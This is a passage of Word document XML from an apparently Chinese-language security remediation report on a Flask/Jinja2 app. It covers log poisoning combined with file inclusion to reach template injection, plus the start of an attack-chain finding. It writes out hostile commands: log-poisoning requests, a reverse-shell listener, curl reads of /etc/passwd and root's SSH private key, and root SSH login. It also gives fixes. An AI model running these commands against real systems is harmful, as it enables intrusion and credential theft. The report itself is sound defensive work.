                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-73: External Control of File Name or Path</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由将文件内容直接渲染到 Jinja2 模板中（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>{{ page_content | safe }}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>），且未做任何输入清洗。攻击者可以利用系统的日志记录机制，将恶意代码写入日志文件，再通过 LFI 包含日志，使恶意代码在 Jinja2 模板上下文中被执行，从而实现从"文件读取"到"远程代码执行"的升级。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>场景 A — SSH 日志投毒（最常用）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Step 1: 向 SSH 认证日志写入恶意 SSTI payload</w:t>
        <w:br/>
        <w:t>$ ssh "{{SSTI_PAYLOAD}}"@target</w:t>
        <w:br/>
        <w:t># 认证失败后 /var/log/auth.log 中会记录：</w:t>
        <w:br/>
        <w:t># Failed password for invalid user {{ SSTI_PAYLOAD }} from 192.168.1.100</w:t>
        <w:br/>
        <w:t># 恶意内容已成功写入系统日志</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 2: 通过 LFI 包含日志文件触发代码执行</w:t>
        <w:br/>
        <w:t>GET /page?name=../../var/log/auth.log</w:t>
        <w:br/>
        <w:t>→ 日志内容被作为 HTML 渲染</w:t>
        <w:br/>
        <w:t>→ 如果日志内容包含 Jinja2 模板语法，服务端执行</w:t>
        <w:br/>
        <w:t>→ 攻击者可执行任意 Python/Shell 命令</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 3: 反弹 Shell 实现持久控制</w:t>
        <w:br/>
        <w:t>$ nc -lvnp 4444  # 在攻击机监听</w:t>
        <w:br/>
        <w:t>→ 日志投毒 + LFI 触发后，目标服务器反向连接攻击机</w:t>
        <w:br/>
        <w:t>→ 攻击者获得可交互的 Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>场景 B — HTTP User-Agent 日志投毒</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 向 Web 访问日志写入恶意 payload</w:t>
        <w:br/>
        <w:t>GET / HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: target</w:t>
        <w:br/>
        <w:t>User-Agent: {{ SSTI_PAYLOAD }}</w:t>
        <w:br/>
        <w:br/>
        <w:t># LFI 包含 Web 日志</w:t>
        <w:br/>
        <w:t>GET /page?name=../../var/log/apache2/access.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 从文件读取升级为远程代码执行（RCE）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：攻击链从被动读取升级为主动执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 无文件落地攻击</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：日志投毒无需上传任何文件，纯日志注入即可完成，无文件型后门极难被扫描检测</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 持久化控制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：日志轮转后 payload 重新生效，攻击者可持续控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 内网横向移动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：RCE 后可在内网执行任意命令，扫描横向攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>三重防御彻底阻断日志投毒攻击链：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># [防御1] 白名单阻断目录穿越（漏洞1修复）</w:t>
        <w:br/>
        <w:t>if name not in ALLOWED_PAGES:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "页面不存在", 404       # auth.log 被 404 阻断</w:t>
        <w:br/>
        <w:br/>
        <w:t># [防御2] 路径规范化防护（漏洞3修复）</w:t>
        <w:br/>
        <w:t>real_path = os.path.realpath(filepath)</w:t>
        <w:br/>
        <w:t>if not real_path.startswith(os.path.realpath(PAGES_DIR) + os.sep):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "页面不存在", 403</w:t>
        <w:br/>
        <w:br/>
        <w:t># [防御3] 输出清洗——即使文件被读取，也清洗恶意代码</w:t>
        <w:br/>
        <w:t>content = bleach.clean(content, tags=allowed_tags, strip=True)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>攻击环节</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>阻断点</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>效果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>日志投毒写入 auth.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SSH 认证日志（外部无法控制）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 外部无法写入系统日志</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>LFI 包含日志</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">白名单阻断 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../var/log/auth.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>代码执行渲染</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Bleach 清洗移除恶意标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 5】内网穿透 + 远程代码执行攻击链（Kali 场景）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> （组合漏洞攻击链）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-98: Improper Control of Filename</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">本漏洞并非单一代码缺陷，而是漏洞 1（LFI 目录穿越）和漏洞 2（SSH 私钥泄露）的组合利用——攻击者在公网 Kali 攻击机上通过 HTTP 请求即可一步步渗透进入目标服务器内网。由于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由无任何权限控制和路径过滤，且应用以 root 运行，整套攻击链无需任何身份凭据即可完成。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>攻击者使用 Kali Linux（或任何具备网络访问能力的攻击机）扫描到目标 Web 应用的 LFI 漏洞后，可构建如下自动化攻击流水线，从外网扫描到内网控制全过程无需交互：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Kali (192.168.1.100)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├─ ① 信息收集与 LFI 确认</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    curl "http://target/page?name=../../etc/passwd"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    → 确认存在 LFI，获取操作系统用户名列表</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├─ ② 窃取 SSH 私钥实现内网穿透</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    curl "http://target/page?name=../../root/.ssh/id_rsa"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    → 下载私钥文件</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├─ ③ SSH 登录，突破网络边界</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    chmod 600 id_rsa &amp;&amp; ssh -i id_rsa root@target</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    → 从外网直接进入内网，绕过防火墙和 VPN</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├─ ④ 内网渗透横向移动</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │    scp -i id_rsa nmap root@target:/tmp/</w:t>
        <w:br/>
